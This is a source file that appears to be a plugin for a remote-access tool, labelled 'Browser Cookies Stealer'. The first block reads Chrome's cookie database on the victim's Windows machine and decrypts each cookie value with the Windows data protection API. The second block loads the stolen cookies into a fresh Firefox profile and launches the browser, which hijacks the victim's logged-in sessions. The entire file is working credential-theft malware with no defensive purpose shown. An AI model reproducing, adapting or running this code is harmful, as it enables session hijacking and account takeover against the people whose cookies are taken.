plugin_name = r"""cookieStealer"""
plugin_description = r"""Browser Cookies Stealer"""
r_source = r"""
import sqlite3
import win32crypt
# Chrome Stealer
PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\Cookies'
connection = sqlite3.connect(PathName)
sessions = []
with connection:
    cursor = connection.cursor()
    v = cursor.execute('SELECT host_key,name,encrypted_value,creation_utc,expires_utc,secure,httponly,last_access_utc FROM cookies')
    values = v.fetchall()
    for info in values:
        host = info[0]
        name = info[1]
        value = win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1]
        creation = info[3],
        expires = info[4],
        secure = info[5],
        httponly = info[6],
        lastacces = info[7]
        payload = {
                'domain': host,
                'name': name,
                'value': value,
                'creation': creation[0],
                'expires': expires[0],
            }
        sessions.append(payload)
mprint = sessions
"""
l_source = r"""
# Chrome Cookies Stealer
import ast
import threading
cookies = ast.literal_eval(mprint)
log('INITIALIZING FIREFOX...')
def chrome_sessions(cookies, client_id, assets):
    from selenium import webdriver
    from selenium.webdriver.firefox.webdriver import FirefoxProfile
    from selenium.webdriver.common.keys import Keys
    import shutil
    import sqlite3
    import sys
    path_to_profile = os.path.join(os.path.dirname(sys.argv[0]), 'firefoxProfiles', '{}'.format(client_id))
    path_to_cookies = os.path.join(path_to_profile, 'cookies.sqlite')
    default_cookies_path = os.path.join(assets, 'cookieStealer', 'cookies.sqlite')
    if not os.path.exists(path_to_profile):
        os.makedirs(path_to_profile)
    shutil.copy2(default_cookies_path, path_to_cookies)
    with sqlite3.connect(path_to_cookies) as connection:
        cursor = connection.cursor()
        for cookie in cookies:
            try:
                v = cursor.execute('INSERT INTO moz_cookies VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)',
                (None,'.'.join(cookie['domain'].split('.')[-2:]),0,'', cookie['name'],cookie['value'],cookie['domain'], '/',cookie['expires'],'',cookie['creation'],'',''))
                connection.commit()
            except:
                pass
    profile = FirefoxProfile(path_to_profile)
    driver_chrome = webdriver.Firefox(profile)
    ready_html = 'file://'+os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'cookieStealer', 'ready.html').replace('\\', '/')
    driver_chrome.get(ready_html)
chrome_threading = threading.Thread(target=chrome_sessions, args=(cookies, client_id, assets))
chrome_threading.start()
log('INJECT COOKIES AND START FIREFOX')
log('PLEASE WAIT')
"""